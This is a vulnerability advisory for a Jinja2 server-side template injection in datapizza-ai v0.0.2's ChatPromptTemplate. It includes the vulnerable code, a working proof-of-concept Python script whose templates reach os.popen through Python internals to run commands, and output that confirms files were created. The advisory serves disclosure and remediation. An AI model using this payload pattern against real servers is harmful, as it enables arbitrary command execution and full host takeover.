### Summary

A Server Side Template Injection in *datapizza-ai* caused by usage of unsafe functions of Jinja2 allows Remote Command Execution on the server host.

### Details

CVSSv3: CRITICAL 9.1/10 `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

datapizza-ai version: `v0.0.2`

The vulnerability is caused by the usage of vulnerable functions of Jinja2 template engine (*datapizza-ai-core/datapizza/modules/prompt/prompt.py*, source here <https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.2/datapizza-ai-core/datapizza/modules/prompt/prompt.py>).

```python
from jinja2 import Template
# ...
class ChatPromptTemplate(Prompt):
# ...
    def __init__(self, user_prompt_template, retrieval_prompt_template):
        self.user_prompt_template = Template(user_prompt_template)
        self.retrieval_prompt_template = Template(retrieval_prompt_template)
# ...
        # Add user's prompt
        formatted_user_prompt = self.user_prompt_template.render(
            user_prompt=user_prompt
        )
# ...
formatted_retrieval = self.retrieval_prompt_template.render(chunks=chunks)
# ...
```

### PoC

Installation Steps

```bash
python -m venv .env
source .env/bin/activate
pip install datapizza-ai==0.0.2
```

Create a python file with the following content

```python
import uuid

from datapizza.modules.prompt import ChatPromptTemplate
from datapizza.type import Chunk

# Create structured prompts for different tasks
system_prompt = ChatPromptTemplate(
    user_prompt_template="You are helping with data analysis tasks, this is the user prompt: " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned1')}}",
    retrieval_prompt_template="Retrieved " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned2')}} " \
    "content:\n{% for chunk in chunks %}{{ chunk.text }}\n{% endfor %}"
)

print(
    system_prompt.format(
        user_prompt="Hello, how are you?", 
        chunks=[
            Chunk(id=str(uuid.uuid4()), text="This is a chunk"),
        Chunk(id=str(uuid.uuid4()), text="This is another chunk")
        ]
    )
)
```

Execute the file with `python3 poc.py`

Output:

```text
[Turn(blocks=[TextBlock(content=You are helping with data analysis tasks, this is the user prompt: <os._wrap_close object at 0x7fbf6c9c8ad0>)], role=ROLE.USER), Turn(blocks=[FunctionCallBlock(id=a35efb6d-c3af-4899-96ca-e818f3c7d3c4, arguments={'query': ''}, name=search_vectorstore, tool=<datapizza.tools.tools.Tool object at 0x7fbf6c956990>)], role=ROLE.ASSISTANT), Turn(blocks=[<datapizza.type.type.FunctionCallResultBlock object at 0x7fbf6c9c9010>], role=ROLE.TOOL)]
```

Command injection result (`ls -alh`):

```text
total 28K
drwxrwxr-x  3 edoardottt edoardottt 4.0K Oct 14 12:31 .
drwxrwxr-x 13 edoardottt edoardottt 4.0K Oct 14 11:51 ..
-rw-rw-r--  1 edoardottt edoardottt   40 Oct 14 11:53 notes.md
-rw-rw-r--  1 edoardottt edoardottt  962 Oct 14 11:57 poc1.py
-rw-rw-r--  1 edoardottt edoardottt 2.1K Oct 14 12:25 poc2.py
-rw-rw-r--  1 edoardottt edoardottt  808 Oct 14 12:31 poc3-working.py
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned1
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned2
drwxrwxr-x  5 edoardottt edoardottt 4.0K Oct 14 11:53 .venv

```

### Impact

Usually if attackers can control the prompt templates they can subvert the model behavior.  
In this case, attackers can run arbitrary system command without any restriction (e.g. they could use a reverse shell and gain access to the server).  
The impact is critical as the attacker can completely takeover the server host.  
Here a simple Proof of Concept code snippet is shown, but in reality every feature that uses untrusted input in `ChatPromptTemplate` is vulnerable.

### References

- <https://www.hacktivesecurity.com/blog/2025/04/01/cve-2025-25362-old-vulnerabilities-new-victims-breaking-llm-prompts-with-ssti/> (similar vulnerability)
- <https://jinja.palletsprojects.com/en/stable/sandbox/> (Safe Jinja2 setup)

### Credits

Edoardo Ottavianelli ([@edoardottt](https://github.com/edoardottt))
